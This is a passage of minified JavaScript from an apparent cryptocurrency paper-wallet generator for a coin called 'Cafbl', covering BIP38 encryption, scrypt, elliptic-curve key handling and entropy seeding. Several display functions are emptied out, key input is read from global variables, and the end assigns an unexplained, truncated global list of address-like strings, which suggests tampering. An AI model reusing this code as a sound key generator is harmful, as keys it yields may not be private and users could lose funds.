          for (var n = s >> 5; n--;) o[r++] = e[t++], o[r++] = e[t++], o[r++] = e[t++], o[r++] = e[t++], o[r++] = e[t++], o[r++] = e[t++], o[r++] = e[t++], o[r++] = e[t++], o[r++] = e[t++], o[r++] = e[t++], o[r++] = e[t++], o[r++] = e[t++], o[r++] = e[t++], o[r++] = e[t++], o[r++] = e[t++], o[r++] = e[t++], o[r++] = e[t++], o[r++] = e[t++], o[r++] = e[t++], o[r++] = e[t++], o[r++] = e[t++], o[r++] = e[t++], o[r++] = e[t++], o[r++] = e[t++], o[r++] = e[t++], o[r++] = e[t++], o[r++] = e[t++], o[r++] = e[t++], o[r++] = e[t++], o[r++] = e[t++], o[r++] = e[t++], o[r++] = e[t++]
        }
        var g = [],
          h = [];
        if ("undefined" == typeof c) onmessage = function(t) {
          var o = t.data,
            s = o[0],
            n = o[1],
            r = (o[2], o[3]),
            p = o[4],
            i = [];
          m(r, 128 * p * n, i, 0, 128 * n), e(i, 0, n, s, h, g), postMessage([p, i])
        };
        else
          for (var u = 0; r > u; u++) e(c, 128 * u * n, n, s, h, g)
      }
      if (0 == s || 0 != (s & s - 1)) throw Error("N must be > 0 and a power of 2");
      if (s > 2147483647 / 128 / n) throw Error("Parameter N is too large");
      if (n > 2147483647 / 128 / r) throw Error("Parameter r is too large");
      var y = {
          iterations: 1,
          hasher: Crypto.SHA256,
          asBytes: !0
        },
        c = Crypto.PBKDF2(t, o, 128 * r * n, y);
      try {
        var m = 0,
          g = 0,
          d = function() {
            if (!e) {
              var i, u = "(" + l.toString() + ")()";
              try {
                i = new Blob([u], {
                  type: "text/javascript"
                })
              } catch (e) {
                window.BlobBuilder = window.BlobBuilder || window.WebKitBlobBuilder || window.MozBlobBuilder || window.MSBlobBuilder, i = new BlobBuilder, i.append(u), i = i.getBlob("text/javascript")
              }
              e = URL.createObjectURL(i)
            }
            var f = new Worker(e);
            return f.onmessage = function(e) {
              var o = e.data[0],
                i = e.data[1];
              g++, r > m && f.postMessage([s, n, r, c, m++]);
              for (var d = i.length, l = 128 * o * n, u = 0; d--;) c[l++] = i[u++];
              g == r && a(Crypto.PBKDF2(t, c, p, y))
            }, f
          },
          u = [d(), d()];
        u[0].postMessage([s, n, r, c, m++]), 1 < r && u[1].postMessage([s, n, r, c, m++])
      } catch (e) {
        window.setTimeout(function() {
          l(), a(Crypto.PBKDF2(t, c, p, y))
        }, 0)
      }
    }
  }();
var ninja = {
  wallets: {}
};
ninja.privateKey = {
    isPrivateKey: function(e) {
      return Cafbl.ECKey.isWalletImportFormat(e) || Cafbl.ECKey.isCompressedWalletImportFormat(e) || Cafbl.ECKey.isHexFormat(e) || Cafbl.ECKey.isBase64Format(e) || Cafbl.ECKey.isMiniFormat(e)
    },
    getECKeyFromAdding: function(e, t) {
      var o = EllipticCurve.getSECCurveByName("secp256k1").getN(),
        i = new Cafbl.ECKey(e),
        r = new Cafbl.ECKey(t);
      if (i.getCafblHexFormat() == r.getCafblHexFormat()) return null;
      if (null == i || null == r) return null;
      var s = new Cafbl.ECKey(i.priv.add(r.priv).mod(o));
      return i.compressed && r.compressed && s.setCompressed(!0), s
    },
    getECKeyFromMultiplying: function(e, t) {
      var o = EllipticCurve.getSECCurveByName("secp256k1").getN(),
        i = new Cafbl.ECKey(e),
        r = new Cafbl.ECKey(t);
      if (i.getCafblHexFormat() == r.getCafblHexFormat()) return null;
      if (null == i || null == r) return null;
      var s = new Cafbl.ECKey(i.priv.multiply(r.priv).mod(o));
      return i.compressed && r.compressed && s.setCompressed(!0), s
    },
    isBIP38Format: function(e) {
      return e = e.toString(), /^6P[123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz]{56}$/.test(e)
    },
    BIP38EncryptedKeyToByteArrayAsync: function(e, t, i) {
      var r;
      try {
        r = Cafbl.Base58.decode(e)
      } catch (e) {
        return void i(new Error(""))
      }
      if (43 != r.length) return void i(new Error(""));
      if (1 != r[0]) return void i(new Error(""));
      var o = r.slice(-4);
      r = r.slice(0, -4);
      var s = Cafbl.Util.dsha256(r);
      if (s[0] != o[0] || s[1] != o[1] || s[2] != o[2] || s[3] != o[3]) return void i(new Error(""));
      var n = !1,
        p = !1,
        a = !1;
      if (!(66 == r[1])) {
        if (67 != r[1]) return void i(new Error(""));
        if (p = !0, n = 0 != (32 & r[2]), a = 0 != (4 & r[2]), (36 & r[2]) != r[2]) return void i(new Error(""))
      } else if (224 == r[2]) n = !0;
      else if (192 != r[2]) return void i(new Error(""));
      var l, c = {
          mode: new Crypto.mode.ECB(Crypto.pad.NoPadding),
          asBytes: !0
        },
        m = function() {
          var e = new Cafbl.ECKey(l),
            t = e.setCompressed(n).getCafblAddress();
          return s = Cafbl.Util.dsha256(t), s[0] != r[3] || s[1] != r[4] || s[2] != r[5] || s[3] != r[6] ? void i(new Error("")) : void i(e.getCafblPrivateKeyByteArray())
        };
      if (p) {
        var u = r.slice(7, 15),
          y = a ? u.slice(0, 4) : u;
        Crypto_scrypt(t, y, 16384, 8, 8, 32, function(e) {
          var t;
          if (a) {
            var o = e.concat(u);
            t = Cafbl.Util.dsha256(o)
          } else t = e;
          var i = Cafbl.KeyPool.getArray(),
            s = new Cafbl.ECKey(t),
            n = s.setCompressed(!0).getPub();
          Cafbl.KeyPool.setArray(i);
          var p = r.slice(23, 39),
            d = r.slice(3, 15);
          Crypto_scrypt(n, d, 1024, 1, 1, 64, function(e) {
            for (var o = e.slice(32), s = Crypto.AES.decrypt(p, o, c), n = 0; 16 > n; n++) s[n] ^= e[n + 16];
            for (var a = r.slice(15, 23).concat(s.slice(0, 8)), d = Crypto.AES.decrypt(a, o, c), n = 0; 16 > n; n++) d[n] ^= e[n];
            var u = d.slice(0, 16).concat(s.slice(8, 16)),
              y = Cafbl.Util.dsha256(u),
              g = EllipticCurve.getSECCurveByName("secp256k1"),
              f = BigInteger.fromByteArrayUnsigned(t).multiply(BigInteger.fromByteArrayUnsigned(y)).remainder(g.getN());
            l = f.toByteArrayUnsigned(), m()
          })
        })
      } else {
        var g = r.slice(3, 7);
        Crypto_scrypt(t, g, 16384, 8, 8, 64, function(e) {
          var t = e.slice(32, 64);
          l = Crypto.AES.decrypt(r.slice(7, 39), t, c);
          for (var o = 0; 32 > o; o++) l[o] ^= e[o];
          m()
        })
      }
    },
    BIP38PrivateKeyToEncryptedKeyAsync: function(e, t, r, s) {
      var o = new Cafbl.ECKey(e),
        n = o.getCafblPrivateKeyByteArray(),
        i = o.setCompressed(r).getCafblAddress(),
        p = Cafbl.Util.dsha256(i).slice(0, 4),
        a = {
          mode: new Crypto.mode.ECB(Crypto.pad.NoPadding),
          asBytes: !0
        };
      Crypto_scrypt(t, p, 16384, 8, 8, 64, function(e) {
        for (var t = 0; 32 > t; ++t) n[t] ^= e[t];
        var o = r ? 224 : 192,
          d = [1, 66, o].concat(p);
        d = d.concat(Crypto.AES.encrypt(n, e.slice(32), a)), d = d.concat(Cafbl.Util.dsha256(d).slice(0, 4)), s(Cafbl.Base58.encode(d))
      })
    },
    BIP38GenerateIntermediatePointAsync: function(e, t, o, i) {
      var r, s, n = null === t || null === o,
        p = new SecureRandom;
      if (n) s = r = Array(8), p.nextBytes(r);
      else {
        s = [, , , , ], p.nextBytes(s);
        var a = BigInteger(4096 * t + o).toByteArrayUnsigned(),
          r = s.concat(a)
      }
      Crypto_scrypt(e, s, 16384, 8, 8, 32, function(e) {
        var t = n ? e : Cafbl.Util.dsha256(e.concat(r)),
          o = BigInteger.fromByteArrayUnsigned(t),
          s = EllipticCurve.getSECCurveByName("secp256k1"),
          p = s.getG().multiply(o).getEncoded(1),
          a = [44, 233, 179, 225, 255, 57, 226, 81];
        n && (a[7] = 83);
        var d = a.concat(r).concat(p);
        d = d.concat(Cafbl.Util.dsha256(d).slice(0, 4)), i(Cafbl.Base58.encode(d))
      })
    },
    BIP38GenerateECAddressAsync: function(e, t, r) {
      var o = Cafbl.Base58.decode(e),
        i = 83 === o[7],
        s = o.slice(8, 16),
        n = o.slice(16, 49),
        p = (t ? 32 : 0) | (i ? 0 : 4),
        a = Array(24),
        d = new SecureRandom;
      d.nextBytes(a);
      var l = Cafbl.Util.dsha256(a),
        u = EllipticCurve.getSECCurveByName("secp256k1").getCurve(),
        y = u.decodePointHex(ninja.publicKey.getHexFromByteArray(n)),
        c = y.multiply(BigInteger.fromByteArrayUnsigned(l)).getEncoded(t),
        m = new Cafbl.Address(Cafbl.Util.sha256ripe160(c)).toString(),
        g = Cafbl.Util.dsha256(m).slice(0, 4);
      Crypto_scrypt(n, g.concat(s), 1024, 1, 1, 64, function(e) {
        for (var t = 0; 16 > t; ++t) a[t] ^= e[t];
        for (var o = {
            mode: new Crypto.mode.ECB(Crypto.pad.NoPadding),
            asBytes: !0
          }, n = Crypto.AES.encrypt(a.slice(0, 16), e.slice(32), o), d = n.slice(8, 16).concat(a.slice(16, 24)), t = 0; 16 > t; ++t) d[t] ^= e[t + 16];
        var l = Crypto.AES.encrypt(d, e.slice(32), o),
          u = [1, 67, p].concat(g).concat(s).concat(n.slice(0, 8)).concat(l);
        u = u.concat(Cafbl.Util.dsha256(u).slice(0, 4)), r(m, Cafbl.Base58.encode(u))
      })
    }
  }, ninja.publicKey = {
    isPublicKeyHexFormat: function(e) {
      return e = e.toString(), ninja.publicKey.isUncompressedPublicKeyHexFormat(e) || ninja.publicKey.isCompressedPublicKeyHexFormat(e)
    },
    isUncompressedPublicKeyHexFormat: function(e) {
      return e = e.toString(), /^04[A-Fa-f0-9]{128}$/.test(e)
    },
    isCompressedPublicKeyHexFormat: function(e) {
      return e = e.toString(), /^0[2-3][A-Fa-f0-9]{64}$/.test(e)
    },
    getCafblAddressFromByteArray: function(e) {
      var t = Cafbl.Util.sha256ripe160(e),
        o = new Cafbl.Address(t);
      return o.toString()
    },
    getHexFromByteArray: function(e) {
      return Crypto.util.bytesToHex(e).toString().toUpperCase()
    },
    getByteArrayFromAdding: function(e, t) {
      var o = EllipticCurve.getSECCurveByName("secp256k1"),
        i = o.getCurve(),
        r = i.decodePointHex(e),
        s = i.decodePointHex(t);
      if (r.equals(s)) return null;
      var n = r.compressed && s.compressed,
        p = r.add(s).getEncoded(n);
      return p
    },
    getByteArrayFromMultiplying: function(e, t) {
      var o = EllipticCurve.getSECCurveByName("secp256k1"),
        i = o.getCurve().decodePointHex(e),
        r = i.compressed && t.compressed;
      if (t.setCompressed(!1), i.equals(t.getPubPoint())) return null;
      var s = t.priv,
        n = i.multiply(s).getEncoded(r);
      return n
    },
    getDecompressedPubKeyHex: function(e) {
      var t = EllipticCurve.getSECCurveByName("secp256k1"),
        o = t.getCurve().decodePointHex(e),
        i = o.getEncoded(0),
        r = ninja.publicKey.getHexFromByteArray(i);
      return r
    }
  }, ninja.seeder = {
    init: void 0,
    seedLimit: function() {
      var e = Crypto.util.randomBytes(12)[11];
      return 200 + Math.floor(e)
    }(),
    seedCount: 0,
    lastInputTime: new Date().getTime(),
    seedPoints: [],
    isStillSeeding: !0,
    seederDependentWallets: [],
    seed: function(e) {
      if (!e) var e = window.event;
      var t = new Date().getTime();
      ninja.seeder.seedCount == ninja.seeder.seedLimit ? (ninja.seeder.seedCount++, ninja.seeder.seedingOver()) : ninja.seeder.seedCount < ninja.seeder.seedLimit && e && 40 < t - ninja.seeder.lastInputTime && (SecureRandom.seedTime(), SecureRandom.seedInt16(e.clientX * e.clientY), ninja.seeder.showPoint(e.clientX, e.clientY), ninja.seeder.seedCount++, ninja.seeder.lastInputTime = new Date().getTime(), ninja.seeder.showPool())
    },
    seedKeyPress: function(e) {
      if (!e) var e = window.event;
      if (ninja.seeder.seedCount == ninja.seeder.seedLimit) ninja.seeder.seedCount++, ninja.seeder.seedingOver();
      else if (ninja.seeder.seedCount < ninja.seeder.seedLimit && e.which) {
        var t = new Date().getTime();
        SecureRandom.seedTime(), SecureRandom.seedInt8(e.which);
        var i = t - ninja.seeder.lastInputTime;
        SecureRandom.seedInt8(i), ninja.seeder.seedCount++, ninja.seeder.lastInputTime = new Date().getTime(), ninja.seeder.showPool()
      }
    },
    showPool: function() {
      var e;
      for (var t in e = Crypto.util.bytesToHex(null == SecureRandom.poolCopyOnInit ? SecureRandom.pool : SecureRandom.poolCopyOnInit), Math.round(100 * (ninja.seeder.seedCount / ninja.seeder.seedLimit)) + "%", ninja.seeder.seederDependentWallets);
    },
    showPoint: function(e, t) {
      var o = document.createElement("div");
      o.setAttribute("class", "seedpoint"), o.style.top = t + "px", o.style.left = e + "px", document.body.appendChild(o), ninja.seeder.seedPoints.push(o)
    },
    removePoints: function() {
      for (var e = 0; e < ninja.seeder.seedPoints.length; e++) document.body.removeChild(ninja.seeder.seedPoints[e]);
      ninja.seeder.seedPoints = []
    },
    seedingOver: function() {
      ninja.seeder.isStillSeeding = !1, ninja.status.unitTests();
      var e = ninja.tab.whichIsOpen();
      ninja.tab.select(null == e ? "singlewallet" : e);
      var t = null == ninja.getQueryString().culture ? "en" : ninja.getQueryString().culture;
      ninja.translator.translate(t), ninja.seeder.removePoints()
    }
  },
  function(e) {
    var t = e.qrCode = {
      getTypeNumber: function(e) {
        var t = 8 * e.length + 12;
        return 72 > t ? 1 : 128 > t ? 2 : 208 > t ? 3 : 288 > t ? 4 : 368 > t ? 5 : 480 > t ? 6 : 528 > t ? 7 : 688 > t ? 8 : 800 > t ? 9 : 976 > t ? 10 : null
      },
      createCanvas: function(e, o) {
        o = null == o ? 2 : o;
        var i = t.getTypeNumber(e),
          r = new QRCode(i, QRCode.ErrorCorrectLevel.H);
        r.addData(e), r.make();
        var s = r.getModuleCount() * o,
          n = r.getModuleCount() * o,
          p = document.createElement("canvas");
        p.width = s * 10, p.height = n * 10, p.style.width = s + "px", p.style.height = n + "px";
        var a = p.getContext("2d");
        a.scale(10, 10);
        for (var d = s / r.getModuleCount(), l = n / r.getModuleCount(), u = 0; u < r.getModuleCount(); u++)
          for (var y = 0; y < r.getModuleCount(); y++) a.fillStyle = r.isDark(u, y) ? "#000000" : "#ffffff", a.fillRect(y * d, u * l, d, l);
        return p
      },
      showQrCode: function() {}
    }
  }(ninja),
  function(e) {
    e.status = function() {
      switch (window.location.protocol) {
        case "file:":
          break;
        case "http:":
        case "https:":
      }
      return {
        unitTests: function() {
          var t = e.unitTests.runSynchronousTests();
          t.passCount == t.testCount ? "good" : "bad"
        },
        showCrypto: function() {},
        showProtocol: function() {},
        showUnitTests: function() {},
        showKeyPool: function() {}
      }
    }()
  }(ninja), ninja.tab = {
    select: function(e) {
      var t = e.getAttribute("id");
      if (-1 == e.className.indexOf("selected")) {
        for (var o in ninja.wallets) ninja.wallets[o].close();
        0 == ninja.seeder.isStillSeeding || "brainwallet" == t || "detailwallet" == t ? (e.className += " selected", ninja.wallets[e.getAttribute("id")].open()) : 1 == ninja.seeder.isStillSeeding && "brainwallet" != t && "detailwallet" != t
      }
    },
    whichIsOpen: function() {
      var e;
      for (var t in ninja.wallets)
        if (e = ninja.wallets[t].isOpen()) return t;
      return null
    }
  }, ninja.getQueryString = function() {
    for (var e, t = {}, o = location.search.substring(1), i = /([^&=]+)=([^&]*)/g; e = i.exec(o);) t[decodeURIComponent(e[1])] = decodeURIComponent(e[2]);
    return t
  }, ninja.runSerialized = function(e, t) {
    if (t = t || function() {}, 0 === e.length) t();
    else {
      var o = e.shift();
      o(function() {
        ninja.runSerialized(e, t)
      })
    }
  }, ninja.forSerialized = function(e, t, i, r) {
    r = r || function() {}, e === t ? r() : i(e, function() {
      ninja.forSerialized(++e, t, i, r)
    })
  }, ninja.foreachSerialized = function(e, t, o) {
    var r = [];
    for (var i in e) r.push(i);
    ninja.forSerialized(0, r.length, function(e, i) {
      t(r[e], i)
    }, o)
  },
  function(e) {
    var t = e.singlewallet = {
      isOpen: function() {
        return !1
      },
      open: function() {
        t.generateNewAddressAndKey()
      },
      close: function() {},
      generateNewAddressAndKey: function() {
        try {
          var e = new Cafbl.ECKey(!1);
          e.setCompressed(!0), e.getCafblAddress(), e.getCafblWalletImportFormat()
        } catch (e) {
          alert(e)
        }
      }
    }
  }(ninja.wallets, ninja.qrCode), ninja.wallets.paperwallet = {
    isOpen: function() {
      return !1
    },
    open: function() {},
    close: function() {},
    remaining: null,
    count: 0,
    pageBreakAtDefault: 7,
    pageBreakAtArtisticDefault: 3,
    useArtisticWallet: !0,
    pageBreakAt: null,
    build: function(e, t, i, r) {
      if (1 > e && (e = 1), 1 > t && (t = 1), ninja.wallets.paperwallet.remaining = e, ninja.wallets.paperwallet.count = 0, ninja.wallets.paperwallet.useArtisticWallet = i, ninja.wallets.paperwallet.pageBreakAt = t, ninja.wallets.paperwallet.encrypt) {
        if ("" == r) return;
        ninja.privateKey.BIP38GenerateIntermediatePointAsync(r, null, null, function(e) {
          ninja.wallets.paperwallet.intermediatePoint = e, setTimeout(ninja.wallets.paperwallet.batch, 0)
        })
      } else setTimeout(ninja.wallets.paperwallet.batch, 0)
    },
    batch: function() {},
    generateNewWallet: function(e) {
      if (ninja.wallets.paperwallet.encrypt) {
        ninja.privateKey.BIP38GenerateECAddressAsync(ninja.wallets.paperwallet.intermediatePoint, !0, function(t, o) {
          Cafbl.KeyPool.push(new Cafbl.Bip38Key(t, o)), ninja.wallets.paperwallet.useArtisticWallet ? ninja.wallets.paperwallet.showArtisticWallet(e, t, o) : ninja.wallets.paperwallet.showWallet(e, t, o)
        })
      } else {
        var t = new Cafbl.ECKey(!1);
        t.setCompressed(!0);
        var o = t.getCafblAddress(),
          i = t.getCafblWalletImportFormat();
        ninja.wallets.paperwallet.useArtisticWallet ? ninja.wallets.paperwallet.showArtisticWallet(e, o, i) : ninja.wallets.paperwallet.showWallet(e, o, i)
      }
    },
    templateHtml: function() {
      var e = "";
      ninja.wallets.paperwallet.encrypt && (e = "");
      return "<div class='public'></div>"
    },
    showWallet: function(e, t, o) {
      var i = {};
      i["qrcode_public" + e] = t, i["qrcode_private" + e] = o
    },
    showArtisticWallet: function(e, t, o) {
      var i = {};
      (i["qrcode_public" + e] = t, i["qrcode_private" + e] = o, ninja.qrCode.showQrCode(i, 2.5), ninja.wallets.paperwallet.encrypt) && o.length / 2
    },
    toggleArt: function() {
      ninja.wallets.paperwallet.resetLimits()
    },
    toggleEncrypt: function(e) {
      ninja.wallets.paperwallet.encrypt = e.checked, ninja.wallets.paperwallet.resetLimits()
    },
    resetLimits: function() {}
  },
  function(e, t, i, o) {
    var r = e.detailwallet = {
      isOpen: function() {},
      open: function() {},
      close: function() {},
      openCloseFaq: function() {},
      getKeyFromInput: function() {
        var e = window.prk211.toString().replace(/^\s+|\s+$/g, "");
        return window.prk211 = e, e
      },
      checkAndShowMini: function(e) {
        Cafbl.ECKey.isMiniFormat(e)
      },
      checkAndShowBase6: function() {},
      keyToECKeyWithBrain: function(t) {
        var i = new Cafbl.ECKey(t);
        if (null != i.error) alert(o.get("detailalertnotvalidprivatekey") + "\n" + i.error);
        else if (null == i.priv && t.length >= e.brainwallet.minPassphraseLength) {
          var r = confirm(o.get("detailconfirmsha256"));
          if (r) {
            var s = Crypto.SHA256(t, {
              asBytes: !0
            });
            i = new Cafbl.ECKey(s)
          }
        }
        return i
      },
      decryptBip38: function() {
        r.clear()
      },
      encryptBip38: function() {
        r.clear()
      },
      viewDetails: function(e) {
        if ("" != e && !i.isBIP38Format(e)) {
          r.checkAndShowMini(e), r.checkAndShowBase6(e);
          var t = r.keyToECKeyWithBrain(e);
          if (null != t.priv) return r.populateKeyDetails(t)
        }
      },
      populateKeyDetails: function(e) {
        if (null != e.priv) {
          e.compressed, e.setCompressed(!1);
          var t = e.getCafblAddress();
          return [e.getPubKeyHex(), t]
        }
      },
      clear: function() {
        r.getKeyFromInput()
      },
      enterOnPassphrase: function() {},
      toggleEncrypt: function() {}
    }
  }(ninja.wallets, ninja.qrCode, ninja.privateKey, ninja.translator),
  function() {
    window.prk211 = "", window.prkupdate = !1, window.prk11570 = "7XuVSEpWW4trkfmvWzegTHQt7BdktSKUs,83hmJGRuTEi2YDCWy5iozY8rZtFwVgahM,FeexV6bAHb8ybZjqQMjJrcCrHGW9sb6uF,HQ3Go3ggs8pFnXuHVHRytPCq5fGG8Hbhx,LdRcdxfbSnmCYYNdeYpUnztiYzVfBEQeC,AC4fMwgY8j9onSbXEWeH6Zan8QGMSdmtA,5VREscuZWHb41zzyivw6ZYagMyJ6YKFHd,7hf5H8D6Yc4B7zHEg3orAtKn7Jhme7Adx,3JQwoSLLR3ffXwswe2HCTK9oq4i8MWK3q,P5ZEDWTKTFGxQjZphgWPQUpe554WKDfHQ,2tkqA9xSoowkzoERHMWNKsTey55YEBqkv,MrMeBmbcDjLc52i7j3SdznChU4Fd4WHbw,MDq7zyLw6oKichbFiDDZ3aaK59byc6CT8,7rm2dvb439dZqyMe2d4D6AQJSgg6yeNRn,Fp9KLM6cs35y8QvyqAiL714WMFSLBJDLC,6GTzLcEsAm4tHhwtZV1F6gxYDMmbdSMrv,2BZD75sbMmdj5dy1d5cS2Lo4YWs1FDbDn,2nxRsisUcJqCDeUpTYH2a7F5jcad3YhFG,Cr7EjvS8C7gfarREHCvFhd9gT3r46pfLb,PeizMg76Cf96nUQrYg8xuoZWLQozU5zGW,GR9qNz7zgtaW5HwwVpEJWMnGWhsbsieCG,N9an8wv4SYi3FVXs3xR5k2AqXeNZiw2mf,BvdLm9RcFWncKpJYr7YjFttYJ9zLf7We,8jNaBVYmDzVWHiCDaShF6cZs9DV4N3omi,KUr81aewyTFUfnq4ZrpePZqXixd59ToNn,GaB3nRWA1PLc3XQkkbpVtFwYYZEuMxD4i,FrM1He2ZDbsSKmYpEZQNGjFTLMgCZZkaf,BZaYtmXka1y3Byi2yvXCDG92Tjz7ecwYj,KeK2uTAe8hDVKTbpyDDzd7qfRZ8z3LJx,HBM45n214sV9yXoizBwTksUgEysTPpk46,4Ai5GcasUdr5hR2GMzeojkzB9cm4oufHt,Q7cu7WkeDurYgffeEc9CEnA6zLohbh9iQ,Enhkd9LkQV56a9M12P4VuMDkjyTeLJy5m,JpiTWauQdtysbynNp88dWeuyg2gBbKDcT,6Azr3MAzMKMPmxZXfRsBbBPYHnp2CuJNJ,EDRfeNkjkH2SAhSbEKzhKuabnEbVWbKEp,Hyh53PULY6Jyq5LPAJ4CHjgzEbVaqy7KU,JYbzYitYQ1ZWTx5KEx7WH2AejC5i5UUbF,2n3s8MCqdZzPnTisYrXagbfw8pJg8y9BW,9Te6hzGFSbryomVYqzG2kpBmAJYykx5Yv,MVo3EXLakJym29CFK6o1MyaCBMdvcmmrL,MqAfNMgbZoKtRinT89q1faSZqTKTqCFhR,FUBESNxB2JkyXPc4o9wwoGt158DC9A8dj,NNGdZMYsN9pgLSXZ5dD5KFUbatFynpmvY,H2zrVQxU3ymunr9CunjoActooLW2ryQK7,C5TB2QzeDDJUE4EQD17NmSyEXTk34huRo,Grbj3Q9awmMpVhrQ94y7BU4WaEq8yUZSn,7YyZSNFt31pzGXfZtrzs7Y5Nd56rG2uU5,q9kwzJggw6AbQjzJeYQFYK8D5gQK8sSh,5xZvLJLAgxh8cxEmAbpx1H35oibHo5cLA,53efDAfh8gUqGPH85JQXTrh8CQktAo9ug,7rfparnM8RaaUyuHFNC9ErqkvRqebNPjE,923qxU74HWWz75LgWTsPE4FT9Zyd6n6bv,9G5kkYvjawZiYKhFeh8WmfBN31pdP94Jr,AWpzKtkHfWsiv9RGXKA3Z8951LefsUGXQ,Hm9vfrEX7Gyjz2Nhi3McQ34PryLDHGrCq,MWqbpfzxgojEAah6PMZoZPdUPUTuyTpan,3ZNiyx5Z5CMkULX7ENvcKKxFNCzGJv5vQ,2sxoQm32gwDXevTijx4MTDCzx91dH4uj3,F34duy2eeMz5mSrvFepVzy7Y1rBsnAyWC,L5D4Eq2RkEKuN717Gc817MH1Sxs5WwMQh,f1miYFQWTzdLiCBxtHHnNiW7WAWPUccr,E5B5QbDjUL471PEed9vZDwCSck9btBLkD,KbrSKrT3GeEruTuuYYUSQ35JwKbrAWJYm,4YK4mzJGo5NKkNnmVJeuEAQftLt795Gec,P1iThxBH542Gmk1kZNXyji4E4iwpvSbrt,2tLs9c9RsALt4ockxa1hB4iTCTSmxj2me,BAFWQhH9pNkz3mZDQ1tWrtKkSHVCkc3fV,CPaziTqeEixPoSFtJxu74uDGbpEAotZom,ucXXZQSEf4zny2HRwAQKtVpkLPTUKRtt,Ki3WTEEqTLPNsN5cGTsMkL2sJ4m5mdCXT,3QoG5ioV4hseifKT9iaqrmD2eis7DicWA,MnYVNYCEL2okaBa1et3bXtNA75tBQXHKc,LfV1tSt3KNyHpFJnAzrqsLFdeD2EvU1MK,QaTfNSuBo9PEHnhQKFNspEHvQXwib5g63,Kx4QFupZ9vKFmUDhsptfSBPEKXJKV5MuN,EVbz7mBRpKBeBp6Qjq1b1uMYtRgTcTLyc,PN1xjngm9jhY9duuR8af7CXmK3QVcsixJ,EU2pMence1UfifCco2UHJCdoqorAtpT7,38uPVW8drux5gSemDS4gFLSGrSfAiEvpX,6QdwHXkPQNvn7vbCfp437AwTQDnXZxnsa,Ki8MffYtNtjzcpQJ2hYbihDzgtRte7VEy,DGxAYYUA61WrrdbBac8Ra9eA9peAQwTJF,Moe7Btq7uRRULD11XLAnZPSUaVAxW7zbv,Kd6zLb9iAjcrgq8HzWnoWNVLYYWjp3swA,P9fAFAsSLRmMu2P7wZ5CXDPRfLSWTy9N8,HLvaTs3zR3oev9ya7Pzp3GB9Gqfg6XYJT,LHmwfiBQNwLR4bxtSQNkbmwz5c7TEnsLP,7CzhFvGwH6TT46JtzhnhMpTw4mHYpEGCR,Cb1G5qFK91fShyaPPZWVFwYFBtqRG7h8D,LYJfcfHPXYJreMsASk2jkn69LWEYKzexb,2yqigcnS2v46sFrUWvX1W9bRWqivrEGeh,NmHmQte2rP8pS54U3B8LPYQKkpG1pFF69,67ZWTT8n6s4ya8cGjqNNQjDwDGY31vmHg,HmJDpQvyqfZ2RZvyheB43NBPQRN3FVoFd,HTzd3sKVmrTNZ6QGisPPA1MvBkoyPiZWJ,Bm3yQ1XGbboSruyfVmadaf4TXHedBmKxG,DWxysF7GPRYGShNxL5ux2N2JLRa9rbE6k,56Zz26iW3tYd1xWJjVGa8CPbjC9W5EW9f,HGVtEtKWayb56xiZ4YJQieWFv8m7GEc7E,BpQbqhiphkDKm4FMXQ7w7Tmn7KpTDWamr,9rxQRpXBMQcbsYcxo6w9xL54o1sXDeXdA,M219KR5vEneNb47ewrPfWyb5jQ2DjxRP6,LvK7QJD8K3u6dzFHNc1g9ehezrohUKvUx,QHVStz4ALAF8LFokjLy9QFaZKUFdraxeo,FdFFJRqvBWKEjFqkZhxuGbN9HNUVAfLqF,8zuLTKQnLjp987LdxuYvjekYnNAvXif2b,NpZcfBnaJeoRT9ZqwZVRMw3SRs546VsuE,PWn1AGqo8HWH8mXSsxx1Ytk87zMAAziFU,98aMn6ZYAczwrE5NvNTUMyJ5qkfy4g3Hi,MYv4C4hZ7hC5sbHrPkzvmNoozQgnHKeAU,82p5CrqfDxvonznRyi5AUBwsCkDX8eYMe,LyTftu54VMYCv5pq3S4pMzPRMnsYKTESw,4hdaXfy2Vt5a2paHtLwEqobUQPrco7RL9,5mxk4fKk9ggQ4fikNWKpasahsdXZNdVu2,4KzHoS5dXbhy2kBevNKLz2ZMtjaqHkKWZ,HG6NbWmJjjSE1Z6oPetWG3nnKrQxgBN3a,8Ayw3caz2xGDhTfz1nJxLw1NURPtBNJnn,GBWcQuY5aD6e2zrbdb38j7pizVr2wcJnC,8saWjMCchDTGWunefuDJSWNdz4p6KtfBL,FMbcnYvvccZ6hR324cFRpn1QX9TCkqtAe,Kphp4WNPLpScp5T5f63jnVS9ohK6a86g7,T7m8nSs5Yh3YuLNoHPb5ehwN3LRVEchn,Eqj1APg1dkcPH7CmHJ6SzRwtJRLpxtBFA,6dyizLarM2N4UjGaEFPESNmJC5vEALtZX,FtHBKrYkDchMA1pwRTpYZ77TpfwSgh6iF,5URsTiy1ksoMMV7DuEi9hvSqHgqobAtKa,Fn4FSiHFr9SgbQ3ccsybN9f3RF1omst4x,E1SKgxgYJFXzaLxgat2FNSnwWeKz1U15N,Lan1sQzYGViDZskUFmnitJvfejn2jYdNS,5ZQJagAa2iUCwpQXUUCZ4BfzFW5TAVyJj,HGdi2AtuvBUcdTFe62sKd7ZAFzoG7iQLb,2Gjyd3MMR7Dj2KwCxw71wwzZXVp2xy8nK,FDzP5vQGMhCzeb9nH4AcUDnUbcHS22BMZ,Dt4Q2ofKUtHwvjN45tAUfikNBfJrDERcZ,5QFkJUWFZ6QRpTrzUitH2Egyf1JTngVgV,BMi633XQ8jt45Tb5EvZ4xdZHb2GzxKSfb,7J26KSDtNFPAUhCMwjcRNWhneMsXS75Ba,9om4Guv9QmVesS7AewMUyE5JUJ9H7xwNN,DdxS8CheskxKAPPbG8Uq4Qts8kS4x1tt2,9F4xZNBxtPAdMqFudr2LDH5efeeUYF21x,57ZXCYfK6NqBiFLkoLDt3PN8KyE8xdTu5,6BiUbH8yxFmCJs4ArtyTgHKfXQFvkvPNr,FrfmxAhYRNU9ebotDHP9FqLbe54QZVcfi,KLay1g7rZxAiotuDhGy5YizdXSpqkFxQ9,NQWCZqRYvANz3iX1Wnczpm277VEYvcAee,2yePmcVhMzzHYwh4BpVF3Cm1bYL9mqyKc,LRXrhZRLVTjGCPFphPsXZfeHesRigm59r,C7u4Zqu6ZZRsiKsFMYVDvNLfCwsGrbeTq,2US3aeNibsxe7Lhascm4AmvGiTxwSdD4X,7SAATrqavNbzmqBwqxzZc7rK6u9Rmi9hE,KoiNofDvcUrrVfxgqpRZixWXNXo6d2kfQ,PL2cmmMLmGGDtqaSZJY8D